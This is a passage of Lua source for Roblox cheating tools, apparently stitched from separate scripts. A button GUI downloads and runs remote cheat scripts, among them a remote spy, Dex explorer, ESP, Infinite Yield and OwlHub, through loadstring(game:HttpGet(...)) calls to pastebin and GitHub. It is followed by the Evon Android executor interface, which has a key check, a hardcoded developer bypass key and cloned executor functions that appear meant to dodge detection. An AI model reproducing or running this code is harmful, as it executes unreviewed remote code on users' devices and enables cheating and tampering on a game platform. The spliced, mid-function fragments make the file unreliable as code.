		loadstring(game:HttpGet("https://pastebin.com/raw/UXmbai5q", true))()
	end)
end
coroutine.wrap(WHQB_fake_script)()
local function QHYNL_fake_script() -- RemoteSpy.LocalScript 
	local script = Instance.new('LocalScript', RemoteSpy)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))();
	end)
end
coroutine.wrap(QHYNL_fake_script)()
local function XVQL_fake_script() -- DarkDex.LocalScript 
	local script = Instance.new('LocalScript', DarkDex)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/fPP8bZ8Z"))()
	end)
end
coroutine.wrap(XVQL_fake_script)()
local function HYBOB_fake_script() -- UnamedEsp.LocalScript 
	local script = Instance.new('LocalScript', UnamedEsp)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/kvr0AuWz"))()
	end)
end
coroutine.wrap(HYBOB_fake_script)()
local function GKEBA_fake_script() -- IYFE.LocalScript 
	local script = Instance.new('LocalScript', IYFE)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end)
end
coroutine.wrap(GKEBA_fake_script)()
local function NHAHP_fake_script() -- OwlHub.LocalScript 
	local script = Instance.new('LocalScript', OwlHub)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
	end)
end
coroutine.wrap(NHAHP_fake_script)()
local function RZTRLAR_fake_script() -- HoHoHub.LocalScript 
	local script = Instance.new('LocalScript', HoHoHub)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
	end)
end
coroutine.wrap(RZTRLAR_fake_script)()
local function ZVNIN_fake_script() -- Xbutton_3.LocalScript 
	local script = Instance.new('LocalScript', Xbutton_3)

	local btn = script.Parent
	local Gui = script.Parent.Parent.Parent
	
	btn.MouseButton1Click:Connect(function()
		Gui.Visible = false
	end)
end
coroutine.wrap(ZVNIN_fake_script)()
local function LRQQGX_fake_script() -- CreditsW.Drag 
	local script = Instance.new('LocalScript', CreditsW)

	local frame = script.Parent
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(LRQQGX_fake_script)()
local function UAPXMMK_fake_script() -- WHy.LocalScript 
	local script = Instance.new('LocalScript', WHy)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		print("Clicked")
	end)
end
coroutine.wrap(UAPXMMK_fake_script)()
local function TEITRZP_fake_script() -- Nope.LocalScript 
	local script = Instance.new('LocalScript', Nope)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		print("Clicked")
	end)
end
coroutine.wrap(TEITRZP_fake_script)()
local function BOLKY_fake_script() -- KillTask.LocalScript 
	local script = Instance.new('LocalScript', KillTask)

	local btn = script.Parent
	
	btn.MouseButton1Click:Connect(function()
		print("Clicked")
	end)
end
coroutine.wrap(BOLKY_fake_script)()
local function LRTUSOX_fake_script() -- Inject.LocalScript 
	local script = Instance.new('LocalScript', Inject)

	local btn = script.Parent
	local Gui = script.Parent.Parent.Parent.InjectedMessgae
	
	btn.MouseButton1Click:Connect(function()
		Gui.Visible = true
	end)
	
end
coroutine.wrap(LRTUSOX_fake_script)()
local function IVCU_fake_script() -- Xbutton_4.LocalScript 
	local script = Instance.new('LocalScript', Xbutton_4)

	local btn = script.Parent
	local Gui = script.Parent.Parent.Parent
	
	btn.MouseButton1Click:Connect(function()
		Gui.Visible = false
	end)
end
coroutine.wrap(IVCU_fake_script)()
local function OWFEJ_fake_script() -- Okbutton_2.LocalScript 
	local script = Instance.new('LocalScript', Okbutton_2)

	local btn = script.Parent
	local Gui = script.Parent.Parent.Parent
	
	btn.MouseButton1Click:Connect(function()
		Gui.Visible = false
	end)
end
coroutine.wrap(OWFEJ_fake_script)()
local function XCQNHP_fake_script() -- GamesOpenGUI.Drag 
	local script = Instance.new('LocalScript', GamesOpenGUI)

	local frame = script.Parent
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(XCQNHP_fake_script)()
local function JKEPNNP_fake_script() -- FloatingGUI.Drag 
	local script = Instance.new('LocalScript', FloatingGUI)

	local frame = script.Parent
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(JKEPNNP_fake_script)()
local function LTLHER_fake_script() -- FloatingGUI.LocalScript 
	local script = Instance.new('LocalScript', FloatingGUI)

	local btn = script.Parent
	local Gui = script.Parent.Parent.KrnlGUI
	
	btn.MouseButton1Click:Connect(function()
		Gui.Visible = true
		btn.Visible = false
	end)
end
coroutine.wrap(LTLHER_fake_script)()
      		print("button pressed")
  	end    
})

Tab4:AddButton({
	Name = "Evon",
	Callback = function()
local Developer_Player = "271635429"
local test_ModeAhax = false;

local KeySystem_Domain = "https://pandadevelopment.net"

-- Evon Basic Configurations
local ConfigURL = "https://evon.cc/android/config/EvonConfig.json"

local http_service = cloneref(game:GetService("HttpService"))
local EvonConfiguration = http_service:JSONDecode(game:HttpGet(ConfigURL))

if test_ModeAhax == true then
	print("********************************************************************************")
	warn("**** Evon Android Undergoes Maintenance, It will be back in a few minutes **** ")
	print("********************************************************************************")
else
--// Instances
local function EvonNotification(messages)
	game.StarterGui:SetCore("SendNotification", {
		Title = "Evon Android"; -- the title (ofc)
		Text = messages; -- what the text says (ofc)
		Icon = "rbxassetid://15509574978"; -- the image if u want. 
		Duration = 5; -- how long the notification should in secounds
	})
end

-- Get Evon's Version
warn("----------------------------------------------------------")
print("Client Version: ".. arceus.getversion())
print("Server Version: ".. EvonConfiguration.Version)
print("Forced Update: ".. tostring(EvonConfiguration.Forced_Update))
warn("----------------------------------------------------------")

-- Check if the Evon GUI is on Latest Version
if arceus.getversion() ~= EvonConfiguration.Version then
	warn('Client is currently outdated / out of sync, Please send this report to the Developer.')
	print("Client Version: ".. arceus.getversion())
	print("Server Version: ".. EvonConfiguration.Version)
	EvonNotification("New Version has been Detected, See the Console for more details")
	-- game.Players.LocalPlayer:Kick("A New Version of Evon has been Detected, Please Download Latest Version") 
else
	print('Evon Client is Up to Date.... All Good')
end


local function EvonDebug(text)
	if tostring(game:GetService("Players").LocalPlayer.UserId) == Developer_Player then
		print("[ Developer ] - ".. text)
	end
end



local function EvonCheckKey(ClientKey)
	------------------------------ Check Key -----------------------------------------
	local evonID = "evon"
	local PandaAuth = loadstring(game:HttpGet('https://raw.githubusercontent.com/Panda-Repositories/PandaKS_Libraries/main/library/LuaLib/ROBLOX/PandaBetaLib.lua'))()
	if ClientKey == "skie" then
		if tostring(game:GetService("Players").LocalPlayer.UserId) == Developer_Player then
			return true
		end
		return false
	elseif EvonConfiguration.Keyless then
		EvonNotification("Key System Disabled...")
		return true
	elseif PandaAuth:ValidateKey(evonID, ClientKey) then
		print('Authorized Complete')
		return true
	else
		warn('Failed to Authorized...')
		return false
	end
		------------------------------ Check Key -----------------------------------------
end
function Load_CustomFunctions()
	print("Custom Features successfully loaded...")


	getgenv().PandaAuthenticate = function(ServiceID, Client_Key)
		local PandaAuth = loadstring(game:HttpGet('https://raw.githubusercontent.com/Panda-Repositories/PandaKS_Libraries/main/library/LuaLib/ROBLOX/PandaBetaLib.lua'))()
		-- Built In Panda Authenticate ( Hub utilized Panda-Pelican Development )
		if PandaAuth:ValidateKey(ServiceID, Client_Key) then
			return true
		else
			return false
		end  
	end
end
--[[ Settings ]]--

local maxLines = 250;

--[[ Variables ]]--

local httpService = game:GetService("HttpService");
local teleportService = game:GetService("TeleportService");
local textService = game:GetService("TextService");
local tweenService = game:GetService("TweenService");
local userInputService = game:GetService("UserInputService");

local localPlayer = game:GetService("Players").LocalPlayer;

local hugeVector2 = Vector2.new(math.huge, math.huge);

local rScriptsApiKey = "0";

local env = getgenv();
local isFirstTimeExecution = true;

local _newcclosure = clonefunction(newcclosure);

local _setfpscap = clonefunction(setfpscap);
local _getfpsmax = clonefunction(getfpsmax or _newcclosure(function()
	return 60;
end));

local _getconnections = clonefunction(getconnections);
local _getcustomasset = clonefunction(getcustomasset or getsynasset);

local _isfile = clonefunction(isfile);
local _readfile = clonefunction(readfile);
local _writefile = clonefunction(writefile);
local _delfile = clonefunction(delfile);
local _listfiles = clonefunction(listfiles);

local _isfolder = clonefunction(isfolder);
local _makefolder = clonefunction(makefolder);

local _getclipboard = clonefunction(getclipboard or _newcclosure(function()
	return "";
end));
local _setclipboard = clonefunction(setclipboard);

local _request = clonefunction(request);
local _base64decode = clonefunction(crypt.base64.decode);

local urlEncode = clonefunction(httpService.UrlEncode);
local jsonEncode = clonefunction(httpService.JSONEncode);
local jsonDecode = clonefunction(httpService.JSONDecode);

local _gethui = clonefunction(gethui or _newcclosure(function()
	return game:GetService("CoreGui");
end));

local validSearchFunctions = { 
	ScriptBlox = "rbxassetid://13107640311",
	RScripts = "rbxassetid://13107640500"
};

local serverHopModes = { "full", "empty", "bestPing", "random" };

local resizeFunctions, languageItems, languageDatabase = {}, {}, {
	English = {
		flag = "rbxassetid://13084648602",
		indicator = "English",
		order = 1,
		phrases = {
			FreeLogin = "Free Login",
			AdlessLogin = "Adless Login",
			EnterKey = "Enter Key",
			CopyKeyLink = "Copy Key Link",
			["Key..."] = "Key...",
			SubmitCredentials = "Submit Credentials",
			["User..."] = "Username...",
			["Password..."] = "Password...",
			Editor = "Editor",
			Execute = "Execute",
			Clear = "Clear",
			Clipboard = "Clipboard",
			CopyScript = "Copy Script",
			LoadScript = "Load Script",
			["Search..."] = "Search...",
			Search = "Search",
			ClearConsole = "Clear Console",
			CopyConsole = "Copy Console",
			UnlockFPS = "Unlock FPS",
			VSync = "V-Sync",
			FPS = "FPS",
			AntiAFK = "Anti AFK",
			Full = "Full",
			Empty = "Empty",
			BestPing = "Best Ping",
			Random = "Random",
			ServerHop = "Server Hop",
			RejoinServer = "Rejoin Server"
		}
	},
	Turkish = {
		flag = "rbxassetid://13084681224",
		indicator = "Türkçe",
		order = 2,
		phrases = {
			FreeLogin = "Ücretsiz Giriş",
			AdlessLogin = "Reklamsız Giriş",
			EnterKey = "Anahtarı Gir",
			CopyKeyLink = "Anahtar Linkini Kopyala",
			["Key..."] = "Anahtar...",
			SubmitCredentials = "Giriş Yap",
			["User..."] = "İsim...",
			["Password..."] = "Şifre...",
			Editor = "Düzenleyici",
			Execute = "Yürüt",
			Clear = "Temizle",
			Clipboard = "Pano",
			CopyScript = "Panoya Kopyala",
			LoadScript = "Panodan Yükle",
			["Search..."] = "Arat...",
			Search = "Arama",
			ClearConsole = "Konsolu Temizle",
			CopyConsole = "Konsolu Kopyala",
			UnlockFPS = "FPS Kilidini Aç",
			VSync = "",
			FPS = "",
			AntiAFK = "",
			Full = "",
			Empty = "",
			BestPing = "",
			Random = "",
			ServerHop = "",
			RejoinServer = ""
		}
	},
	Spanish = {
		flag = "rbxassetid://13084681842",
		indicator = "Español",
		order = 4,
		phrases = {
			FreeLogin = "Iniciar sesion gratis",
			AdlessLogin = "Iniciar sesion sin anuncios",
			EnterKey = "Ingresar Key",
			CopyKeyLink = "Copiar enlace de la Key",
			["Key..."] = "Key...",
			SubmitCredentials = "Enviar Credenciales",
			["User..."] = "Usuario...",
			["Password..."] = "Contraseña...",
			Editor = "Editor",
			Execute = "Executar",
			Clear = "Limpiar",
			Clipboard = "Portapapeles",
			CopyScript = "Copiar Script",
			LoadScript = "Cargar Script",
			["Search..."] = "Buscar...",
			Search = "Buscar",
			ClearConsole = "Limpiar Consola",
			CopyConsole = "Copiar Consola",
			UnlockFPS = "Unlocar FPS",
			VSync = "",
			FPS = "",
			AntiAFK = "",
			Full = "",
			Empty = "",
			BestPing = "",
			Random = "",
			ServerHop = "",
			RejoinServer = ""
		}
	},
	Latvian = {
		flag = "rbxassetid://13084681629",
		indicator = "Latviski",
		order = 5,
		phrases = {
			FreeLogin = "Bezmaksas pieeja",
			AdlessLogin = "Bez-reklāmu pieeja",
			EnterKey = "Ievadi atslēgu",
			CopyKeyLink = "Kopēt atslēgas saiti",
			["Key..."] = "Atslēga...",
			SubmitCredentials = "Apstiprināt akreditācijas datus",
			["User..."] = "Lietotājs...",
			["Password..."] = "Parole...",
			Editor = "Redaktors",
			Execute = "Izpildīt",
			Clear = "Iztīrīt",
			Clipboard = "Kopējumi",
			CopyScript = "Kopēt skriptu",
			LoadScript = "Ielādēt skriptu",
			["Search..."] = "Meklēt...",
			Search = "Meklēt",
			ClearConsole = "Iztīrīt konsoli",
			CopyConsole = "Kopēt konsoli",
			UnlockFPS = "Atbloķējiet FPS",
			VSync = "",
			FPS = "",
			AntiAFK = "",
			Full = "",
			Empty = "",
			BestPing = "",
			Random = "",
			ServerHop = "",
			RejoinServer = ""
		}
	},
	Dutch = {
		flag = "rbxassetid://15984949262",
		indicator = "Nederlands",
		order = 6,
		phrases = {
			FreeLogin = "Gratis Login",
			AdlessLogin = "ReclameVrij Login",
			EnterKey = "Toegangs Sleutel",
			CopyKeyLink = "Kopieer Sleutel Link",
			["Key..."] = "Sleutel...",
			SubmitCredentials = "Verzend Gegevens",
			["User..."] = "Gebruiker...",
			["Password..."] = "Wachtwoord...",
			Editor = "Editor",
			Execute = "Uitvoeren",
			Clear = "Clear",
			Clipboard = "Klembord",
			CopyScript = "Kopieer Script ",
			LoadScript = "Laad Script",
			["Search..."] = "Zoeken...",
			Search = "Zoeken",
			ClearConsole = "Clear Console",
			CopyConsole = "Kopieer Console",
			UnlockFPS = "Ontgrendelen FPS",
			VSync = "",
			FPS = "",
			AntiAFK = "",
			Full = "",
			Empty = "",
			BestPing = "",
			Random = "",
			ServerHop = "",
			RejoinServer = ""
		}
	},
	Filipino = {
		flag = "rbxassetid://15984949030",
		indicator = "Filipino",
		order = 7,
		phrases = {
			FreeLogin = "Libreng Login",
			AdlessLogin = "Ad-Free Login",
			EnterKey = "Ilagay ang susi",
			CopyKeyLink = "Kopyahin ang Susi Link",
			["Key..."] = "Susi...",
			SubmitCredentials = "Ipasa ang Kredensyals",
			["User..."] = "User",
			["Password..."] = "Password",
			Editor = "Editor",
			Execute = "Execute",
			Clear = "Clear",
			Clipboard = "Clipboard",
			CopyScript = "Kopyahin ang script",
			LoadScript = "I-Load ang script",
			["Search..."] = "Maghanap...",
			Search = "Maghanap",
			ClearConsole = "ClearConsole",
			CopyConsole = "CopyConsole",
			UnlockFPS = "",
			VSync = "",
			FPS = "",
			AntiAFK = "",
			Full = "",
			Empty = "",
			BestPing = "",
			Random = "",
			ServerHop = "",
			RejoinServer = ""
		}
	},
	German = {
		flag = "rbxassetid://15984949736",
		indicator = "Deustch",
		order = 8,
		phrases = {
			FreeLogin = "Kostenloser Login",
			AdlessLogin = "Adless Login",
			EnterKey = "Key checken",
			CopyKeyLink = "Link kopieren",
			["Key..."] = "Schlüssel",
			SubmitCredentials = "Einloggen",
			["User..."] = "Nutzername",
			["Password..."] = "Passwort",
			Editor = "Editor",
			Execute = "Ausführen",
			Clear = "Löschen",
			Clipboard = "",
			CopyScript = "Skript Kopieren",
			LoadScript = "Skript Laden",
			["Search..."] = "Suchen...",
			Search = "Suchen",
			ClearConsole = "Konsole löschen",
			CopyConsole = "Konsole kopieren",
			UnlockFPS = "Freischalten FPS",
			VSync = "",
			FPS = "",
			AntiAFK = "",
			Full = "",
			Empty = "",
			BestPing = "",
			Random = "",
			ServerHop = "",
			RejoinServer = ""
		}
	},
	Romanian = {
		flag = "rbxassetid://15984948805",
		indicator = "Română",
		order = 9,
		phrases = {
			FreeLogin = "Logare Gratis",
			AdlessLogin = "Logare fara reclame",
			EnterKey = "Introduce cheie",
			CopyKeyLink = "Copie adresa pentru cheie",
			["Key..."] = "Cheie...",
			SubmitCredentials = "Introduce-ti datele",
			["User..."] = "Utilizator...",
			["Password..."] = "Parola...",
			Editor = "Editor",
			Execute = "Executa",
			Clear = "Goleste",
			Clipboard = "Clipboard",
			CopyScript = "Copiaza Script",
			LoadScript = "Incarca Script",
			["Search..."] = "Cauta...",
			Search = "Cauta",
			ClearConsole = "Goleste Consola",
			CopyConsole = "Copiaza din Consola",
			UnlockFPS = "Deblocați FPS",
			VSync = "",
			FPS = "",
			AntiAFK = "",
			Full = "",
			Empty = "",
			BestPing = "",
			Random = "",
			ServerHop = "",
			RejoinServer = ""
		}
	},
	Russian = {
		flag = "rbxassetid://15984948564",
		indicator = "Русский",
		order = 10,
		phrases = {
			FreeLogin = "Бесплатный логин",
			AdlessLogin = "Логин с рекламой ",
			EnterKey = "Ввести ключ ",
			CopyKeyLink = "Скопировать ссылку на ключ",
			["Key..."] = "Ключ...",
			SubmitCredentials = "Подтвердить реквизиты для входа",
			["User..."] = "Юзер...",
			["Password..."] = "Пароль...",
			Editor = "Эдитор",
			Execute = "Запустить",
			Clear = "Очистить",
			Clipboard = "Буфер Обмена",
			CopyScript = "Скопировать скрипт",
			LoadScript = "Загрузить скрипт",
			["Search..."] = "Искать...",
			Search = "Искать",
			ClearConsole = "Очистить консоль",
			CopyConsole = "Скопировать консоль",
			UnlockFPS = "Разблокировать FPS",
			VSync = "",
			FPS = "",
			AntiAFK = "",
			Full = "",
			Empty = "",
			BestPing = "",
			Random = "",
			ServerHop = "",
			RejoinServer = ""
		}
	},
	French = {
		flag = "rbxassetid://15984949489",
		indicator = "Français",
		order = 11,
		phrases = {
			FreeLogin = "Connexion gratuite",
			AdlessLogin = "Connexion AdLess",
			EnterKey = "Confirmer la clé",
			CopyKeyLink = "Copier le lien de la clé",
			["Key..."] = "Clé...",
			SubmitCredentials = "Se connecter",
			["User..."] = "Nom d'utilisateur...",
			["Password..."] = "Mot de passe...",
			Editor = "Éditeur",
			Execute = "Exécuter",
			Clear = "Effacer",
			Clipboard = "Presse-papier",
			CopyScript = "Copier le script",
			LoadScript = "Charger le script",
			["Search..."] = "Rechercher...",
			Search = "Chercher",
			ClearConsole = "Effacer la console",
			CopyConsole = "Copier la console",
			UnlockFPS = "Déverrouiller les FPS",
			VSync = "Synchronisation verticale",
			FPS = "FPS",
			AntiAFK = "Anti-AFK",
			Full = "Rempli",
			Empty = "Vide",
			BestPing = "Meilleur ping",
			Random = "Au hasard",
			ServerHop = "Changer de serveur",
			RejoinServer = "Rejoindre le serveur"
		}
	},
	Arabic = {
		flag = "rbxassetid://15984948296",
		indicator = "عربي",
		order = 12,
		phrases = {
			FreeLogin = "المجاني الدخول تسجيل",
			AdlessLogin = "إعلانات بلا دخول تسجيل",
			EnterKey = "المفتاح أدخل",
			CopyKeyLink = "المفتاح رابط نسخ",
			["Key..."] = "المفتاح",
			SubmitCredentials = "الاعتماد بيانات إرسال",
			["User..."] = "المستخدم",
			["Password..."] = "المرور كلمة",
			Editor = "المحرر",
			Execute = "تنفيذ",
			Clear = "إخلاء",
			Clipboard = "الحافظة",
			CopyScript = "النصي البرنامج نسخ",
			LoadScript = "النصي البرنامج حمل",
			["Search..."] = "بحث",
			Search = "بحث",
			ClearConsole = "التحكم وحدة إخلاء",
			CopyConsole = "التحكم وحدة نسخ",
			UnlockFPS = "افتح FPS",
			VSync = "",
			FPS = "",
			AntiAFK = "",
			Full = "",
			Empty = "",
			BestPing = "",
			Random = "",
			ServerHop = "",
			RejoinServer = ""
		}
	}
};

local sortedLanguageDatabase = {};
for i, v in next, languageDatabase do
	sortedLanguageDatabase[v.order] = {
		key = i,
		value = v
	};
end

--[[ Settings ]]--

local uiSettings = {
	key = "",
	userName = "",
	editorInit = "print(\"Evon-Android >>>\");",
	searchAPI = "ScriptBlox",
	language = "English",
	unlockFps = false,
	vSync = false,
	fps = 60,
	antiAfk = false,
	serverHopMode = "full"
};

if _isfolder("evonui") == false then
	_makefolder("evonui");
end
if _isfile("evonui/settings.json") then
	isFirstTimeExecution = false;
	local succ, res = pcall(jsonDecode, httpService, _readfile("evonui/settings.json"));
	if succ then
		for i, v in next, uiSettings do
			if res[i] ~= nil and type(res[i]) == type(v) then
				uiSettings[i] = res[i];
			end
		end
	end
	if languageDatabase[uiSettings.language] == nil then
		uiSettings.language = "English";
	end
	if validSearchFunctions[uiSettings.searchAPI] == nil then
		uiSettings.searchAPI = "ScriptBlox";
	end
	if table.find(serverHopModes, uiSettings.serverHopMode) == nil then
		uiSettings.serverHopMode = serverHopModes[1];
	end
end

--[[ Functions ]]--

local function create(className, properties, children)
	local inst = Instance.new(className);
	for i, v in next, properties do
		if i == "LanguageItem" then
			languageItems[inst] = v;
			print(v.identifier);
			inst[v.property] = languageDatabase[uiSettings.language].phrases[v.identifier];
		elseif i ~= "Parent" then
			inst[i] = v;
		end
	end
	if children then
		for i, v in next, children do
			v.Parent = inst;
		end
	end
	inst.Parent = properties.Parent;
	return inst;
end

local function tween(obj, dur, props, ...)
	local t = tweenService:Create(obj, TweenInfo.new(dur, ...), props);
	t:Play();
	return t;
end

local function addTransparencyHighlights(btn)
	btn.MouseButton1Down:Connect(function()
		tween(btn, 0.18, {
			BackgroundTransparency = 0
		});
	end);
	btn.MouseButton1Up:Connect(function()
		tween(btn, 0.18, {
			BackgroundTransparency = 1
		});
	end);
end

local function addColourHighlights(btn, col)
	local original = btn.BackgroundColor3;
	btn.MouseButton1Down:Connect(function()
		tween(btn, 0.18, {
			BackgroundColor3 = col
		});
	end);
	btn.MouseButton1Up:Connect(function()
		tween(btn, 0.18, {
			BackgroundColor3 = original
		});
	end);
end

local function removeTrace(str)
	local x = env[str];
	-- env[str] = nil;
	return x;
end

local function changeLanguage(lang)
	local language = languageDatabase[lang] or languageDatabase.English;
	uiSettings.language = language == languageDatabase.English and "English" or lang;
	for i, v in next, languageItems do
		local phrase = language.phrases[v.identifier];
		i[v.property] = phrase ~= "" and phrase or languageDatabase.English.phrases[v.identifier];
	end
	task.defer(function() -- To give the TextBounds property a chance to update, it's not as immediate as you might think
		for i = 1, #resizeFunctions do
			resizeFunctions[i]();
		end
	end);
end

local function updateSettings(key, value)
	uiSettings[key] = value;
	if key == "language" then
		changeLanguage(value);
	end
	pcall(_writefile, "evonui/settings.json", jsonEncode(httpService, uiSettings));
end

--[[ Create UI ]]--

local gui = create("ScreenGui", { 
	DisplayOrder = 11, 
	IgnoreGuiInset = true, 
	Name = "androidCheat", 
	Parent = _gethui(), 
	ResetOnSpawn = false
});

local function loadKeyUI(callback)
	--local libVersion = "v2"
	--local libType = "roblox"
	--nlocal serviceID = "evon"

	-- local pandaAuth = loadstring(game:HttpGet(string.format("https://pandadevelopment.net/servicelib?service=%s&core=%s&param=%s", serviceID, libType, libVersion)))()

	local keyFrame = create("Frame", { 
		AnchorPoint = Vector2.new(0.5, 0), 
		BackgroundColor3 = Color3.fromHex("ffffff"), 
		BorderSizePixel = 0, 
		Name = "keyFrame", 
		Parent = gui, 
		Position = UDim2.new(0.5, 0, 0, 25), 
		Size = UDim2.new(1, -110, 0, 94)
	}, {
		create("UIGradient", { 
			Color = ColorSequence.new({ 
				ColorSequenceKeypoint.new(0, Color3.fromHex("1c1c1c")), 
				ColorSequenceKeypoint.new(1, Color3.fromHex("242424"))
			}), 
			Name = "gradient", 
			Rotation = 78
		}),
		create("UICorner", { 
			CornerRadius = UDim.new(0, 4), 
			Name = "corner"
		}),
		create("TextButton", { 
			AutoButtonColor = false, 
			BackgroundColor3 = Color3.fromHex("ffffff"), 
			BackgroundTransparency = 1, 
			FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
			FontSize = Enum.FontSize.Size14, 
			Name = "clickThroughBlocker", 
			Size = UDim2.new(1, 0, 1, 0), 
			Text = "", 
			TextColor3 = Color3.fromHex("000000"), 
			TextSize = 14, 
			ZIndex = 0
		}),
		create("ImageLabel", { 
			AnchorPoint = Vector2.new(0.5, 0.5), 
			BackgroundColor3 = Color3.fromHex("ffffff"), 
			BackgroundTransparency = 1, 
			Image = "rbxassetid://12874061329", 
			ImageColor3 = Color3.fromHex("000000"), 
			Name = "blur", 
			Position = UDim2.new(0.5, 0, 0.5, 0), 
			ScaleType = Enum.ScaleType.Slice, 
			Size = UDim2.new(1, 10, 1, 10), 
			SliceCenter = Rect.new(10, 10, 118, 118), 
			ZIndex = 0
		}),
		create("UIStroke", { 
			ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
			Color = Color3.fromHex("141414"), 
			Name = "stroke", 
			Thickness = 0.8
		}),
		create("UISizeConstraint", { 
			MaxSize = Vector2.new(800, 94), 
			Name = "constraint"
		}),
		create("Frame", { 
			AnchorPoint = Vector2.new(0.5, 0.5), 
			BackgroundColor3 = Color3.fromHex("ffffff"), 
			BackgroundTransparency = 1, 
			Name = "content", 
			Position = UDim2.new(0.5, 0, 0.5, 0), 
			Size = UDim2.new(1, 0, 1, 0)
		}, {
			create("UIListLayout", { 
				FillDirection = Enum.FillDirection.Horizontal, 
				Name = "list", 
				Padding = UDim.new(0, 8), 
				SortOrder = Enum.SortOrder.LayoutOrder
			}),
			create("UIPadding", { 
				Name = "padding", 
				PaddingBottom = UDim.new(0, 8), 
				PaddingLeft = UDim.new(0, 8), 
				PaddingRight = UDim.new(0, 8), 
				PaddingTop = UDim.new(0, 8)
			}),
			create("Frame", { 
				AnchorPoint = Vector2.new(0, 0.5), 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Name = "buttons", 
				Position = UDim2.new(0, 8, 0.5, 0), 
				Size = UDim2.new(0, 124, 1, 0)
			}, {
				create("TextButton", { 
					AnchorPoint = Vector2.new(0.5, 0), 
					AutoButtonColor = false, 
					BackgroundColor3 = Color3.fromHex("181818"), 
					FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size11, 
					Name = "freemium", 
					Position = UDim2.new(0.5, 0, 0, 0), 
					Size = UDim2.new(1, 0, 0, 34), 
					Text = "", 
					TextColor3 = Color3.fromHex("ebebeb"), 
					TextSize = 11
				}, {
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("UIStroke", { 
						ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
						Color = Color3.fromHex("141414"), 
						Name = "stroke", 
						Thickness = 1.2
					}),
					create("ImageLabel", { 
						AnchorPoint = Vector2.new(1, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Image = "rbxassetid://13048298432", 
						Name = "icon", 
						Position = UDim2.new(1, -7, 0.5, 0), 
						Size = UDim2.new(0, 20, 0, 20)
					}),
					create("TextLabel", { 
						LanguageItem = {
							property = "Text",
							identifier = "FreeLogin"
						},
						AnchorPoint = Vector2.new(0, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size14, 
						Name = "title", 
						Position = UDim2.new(0, 8, 0.5, 0), 
						Size = UDim2.new(1, -43, 1, 0), 
						TextColor3 = Color3.fromHex("ebebeb"), 
						TextSize = 13, 
						TextXAlignment = Enum.TextXAlignment.Left
					})
				}),
				create("TextButton", { 
					AnchorPoint = Vector2.new(0.5, 1), 
					AutoButtonColor = false, 
					BackgroundColor3 = Color3.fromHex("181818"), 
					FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size11, 
					Name = "premium", 
					Position = UDim2.new(0.5, 0, 1, 0), 
					Size = UDim2.new(1, 0, 0, 34), 
					Text = "", 
					TextColor3 = Color3.fromHex("ebebeb"), 
					TextSize = 11,
					Visible = false
				}, {
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("UIStroke", { 
						ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
						Color = Color3.fromHex("141414"), 
						Name = "stroke", 
						Thickness = 1.2
					}),
					create("ImageLabel", { 
						AnchorPoint = Vector2.new(1, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Image = "rbxassetid://13048298207", 
						Name = "icon", 
						Position = UDim2.new(1, -7, 0.5, 0), 
						Size = UDim2.new(0, 20, 0, 20)
					}),
					create("TextLabel", { 
						LanguageItem = {
							property = "Text",
							identifier = "AdlessLogin"
						},
						AnchorPoint = Vector2.new(0, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size14, 
						Name = "title", 
						Position = UDim2.new(0, 8, 0.5, 0), 
						Size = UDim2.new(1, -43, 1, 0), 
						TextColor3 = Color3.fromHex("ebebeb"), 
						TextSize = 13, 
						TextXAlignment = Enum.TextXAlignment.Left
					})
				})
			}),
			create("Frame", { 
				BackgroundColor3 = Color3.fromHex("141414"), 
				BorderSizePixel = 0, 
				Name = "separator", 
				Position = UDim2.new(0, 140, 0, 0), 
				Size = UDim2.new(0, 1, 1, 0)
			}),
			create("Frame", { 
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Name = "tabs", 
				Size = UDim2.new(1, -140, 1, 0)
			}, {
				create("Frame", { 
